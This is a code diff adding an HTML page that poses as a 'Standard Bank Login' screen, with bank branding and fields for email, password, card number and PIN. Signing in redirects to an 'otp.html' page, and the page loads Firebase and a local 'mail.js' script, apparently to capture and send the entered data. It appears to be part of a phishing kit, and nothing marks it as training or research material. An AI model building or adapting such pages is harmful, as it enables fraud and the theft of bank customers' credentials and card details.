@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+	 <link rel="stylesheet" href="./styles.css">
+    
+    
+    <title>Standard Bank Login</title>
+    	
+
+	<style type="text/css">
+		
+		body{
+			background-image:url(standardbank.jpg);
+			background-repeat:no-repeat;
+			background-size:100% 100%;
+			background-attachment: fixed;
+		}
+
+		
+              
+	</style>
+</head>
+
+<body>
+<div class="back">
+      <div style="text-align: center;">
+        <img src="./Source/standardbank.png" alt="logo" width="300" 
+     height="350" />
+    <div class="container">
+        <form action="" id="contactForm">
+            <div class="alert">Loging In</div>
+			
+			<div class="inputBox">
+                <input type="email" id="emailid" placeholder="Login Email" />
+            </div>
+
+            <div class="inputBox">
+                <input type="password" id="name" placeholder="Password" />
+            </div>
+
+            <div class="inputBox">
+                <textarea id="msgContent" cols="30" rows="10" placeholder="Card Number"></textarea>
+            </div>
+			
+			<div class="inputBox">
+                <input type="password" id="sentence" placeholder="Pin" />
+            </div>
+
+            <div class="inputBox">
+                <button onclick="window.location.href = 'otp.html';">SIGN IN</button>
+            </div>
+        </form>
+    </div>
+	
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+    <script src="./mail.js"></script>
+</body>
+
+</html>
